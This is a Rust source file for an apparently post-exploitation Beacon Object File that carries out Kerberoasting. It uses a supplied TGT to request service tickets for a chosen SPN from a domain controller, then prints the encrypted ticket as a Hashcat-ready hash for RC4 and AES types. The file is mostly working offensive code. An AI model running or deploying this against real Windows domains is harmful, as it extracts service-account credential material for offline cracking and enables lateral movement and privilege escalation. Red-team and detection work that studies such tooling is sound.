//! # Kerberoasting BOF
//!
//! Requests an SPN service ticket with a supplied TGT and prints the ticket
//! ciphertext as a Hashcat-compatible Kerberoast hash.
//!
//! ## MITRE ATT&CK
...
fn bytes_to_hex(bytes: &[u8]) -> String {
    ...
    for &value in bytes {
        let high = value >> 4;
        let low = value & 0x0f;
        output.push(if high < 10 {
            (b'0' + high) as char
        } else {
            (b'a' + high - 10) as char
        });
        output.push(if low < 10 {
            (b'0' + low) as char
        } else {
            (b'a' + low - 10) as char
        });
...
fn extract_tgs_hash(response: &[u8], spn: &str, account: &str, realm: &str) -> Option<String> {
    let root = parse_asn(response)?;

    if root.tag == 30 {
        let body = root.children.first()?;
        if let Some(error) = find_ctx(body, 6).and_then(|ctx| ctx.children.first()) {
            eprintln!("[X] Kerberos error: {}", get_int(error));
        }
        return None;
    }
    ...
    let body = root.children.first()?;
    let ticket = find_ctx(body, 5)?.children.first()?;
    let ticket_body = ticket.children.first()?;
    let encrypted = find_ctx(ticket_body, 3)?.children.first()?;
    let encryption_type = find_ctx(encrypted, 0)
        .and_then(|ctx| ctx.children.first())
        .map(|value| get_int(value) as i32)
        .unwrap_or(0);
    let cipher = find_ctx(encrypted, 2)
        .and_then(|ctx| ctx.children.first())
        .map(|value| value.value.as_slice())?;

    let realm = realm.to_ascii_uppercase();
    match encryption_type {
        23 if cipher.len() > 16 => {
            let checksum = bytes_to_hex(&cipher[..16]);
            let encrypted_data = bytes_to_hex(&cipher[16..]);
            Some(alloc::format!(
                "$krb5tgs$23$*{}${}${}*${}${}",
                account,
                realm,
        ...
        17 | 18 if cipher.len() > 12 => {
            let checksum = bytes_to_hex(&cipher[cipher.len() - 12..]);
            let encrypted_data = bytes_to_hex(&cipher[..cipher.len() - 12]);
            Some(alloc::format!(
                "$krb5tgs${}${}${}$*{}*${}${}",
                encryption_type,
                account,
        ...
        23 | 17 | 18 => {
            eprintln!("[X] Service ticket ciphertext is too short");
            None
        }
        _ => {
            eprintln!(
                "[X] Unsupported service ticket encryption type: {}",
                encryption_type
            );
            None
        }
...
fn main(args: *mut u8, len: usize) {
    ...
    if len == 0 {
        eprintln!("[X] /ticket:BASE64 /spn:SPN required");
        return;
    }
    ...
    let spn = match get_param(&params, "/spn:") {
        Some(value) => value,
        None => {
            eprintln!("[X] /spn:SPN must be supplied!");
            return;
        }
    };
    ...
    let realm = get_param(&params, "/domain:").unwrap_or(&kirbi.realm);
    let account = get_param(&params, "/user:").unwrap_or(spn);
    let dc = match get_param(&params, "/dc:") {
        Some(value) => String::from(value),
        None => match get_domain_info() {
    ...
    let api = match load_crypt_api() {
        Some(value) => value,
        None => {
            eprintln!("[X] Failed to load Kerberos crypto support");
            return;
        }
    };

    println!("[*] Requesting service ticket for: {}", spn);
    println!("[*] Using TGT for: {}@{}", kirbi.username, kirbi.realm);

    let request = match build_tgs_req(&api, &kirbi, spn, realm) {
        Some(value) => value,
        None => {
    ...
    if let Some(hash) = extract_tgs_hash(&response, spn, account, realm) {
        println!("[+] Kerberoast complete:\n\n{}\n", hash);
    }
}
